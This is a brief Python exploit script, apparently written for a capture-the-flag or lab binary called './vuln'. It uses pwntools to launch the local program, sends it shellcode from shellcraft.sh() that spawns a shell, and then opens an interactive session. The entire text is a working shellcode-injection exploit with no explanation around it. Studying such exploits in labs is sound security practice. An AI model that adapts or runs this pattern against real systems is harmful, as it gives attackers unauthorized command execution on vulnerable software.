from pwn import *

context.binary = "./vuln"

p = process()
p.sendline(asm(shellcraft.sh()))
p.interactive()
